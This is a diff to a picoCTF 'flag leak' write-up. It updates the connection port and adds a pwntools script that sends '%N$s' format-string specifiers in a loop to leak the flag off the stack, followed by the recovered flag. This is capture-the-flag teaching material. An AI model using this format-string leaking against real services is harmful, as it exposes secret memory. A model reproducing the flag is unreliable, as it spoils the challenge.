@@ -3,7 +3,7 @@
 ## DESCRIPTION:
 Story telling class 1/2 
 I'm just copying and pasting with this [program](https://github.com/jon-brandy/CTF-WRITE-UP/blob/0782a0d972e244a18c82cbc1c62c2d363bef0c61/Asset/flag%20leak/vuln). what can go wrong? You can view source [here](https://github.com/jon-brandy/CTF-WRITE-UP/blob/0782a0d972e244a18c82cbc1c62c2d363bef0c61/Asset/flag%20leak/vuln.c). 
-And connect with it using: `nc saturn.picoctf.net 61389`
+And connect with it using: `nc saturn.picoctf.net 63788`
 ## HINT:
 1. Format Strings
 ## STEPS:
@@ -144,7 +144,35 @@ print(value)
 
 19. It must be our local flag then.
 20. The conclusion is, this is a `FORMAT STRINGS ATTACK`.
+21. For this solution, i made a python script to do the format strings attack.
 
+```py
+from pwn import *
+import os
+
+os.system('clear')
+
+for i in range(256): # 129 + 64 + 64
+    sh = remote('saturn.picoctf.net', 63788)
+    sh.recvuntil(b'>')
+    sh.sendline('%' + str(i) + '$s')
+    print(sh.recvuntil(b'-')) 
+    print(i) # print the iteration
+    print(sh.recv()) # print the value
+    
+    sh.close # close the session if i == 255
+```
+
+22. At the 24th iteration we got the flag!
+
+![image](https://user-images.githubusercontent.com/70703371/189513593-259e30b4-05f4-4925-8ab4-994d8f65f62c.png)
+
+
+## FLAG
+
+```
+picoCTF{L34k1ng_Fl4g_0ff_St4ck_c2e94e3d}
+```
 
 
 
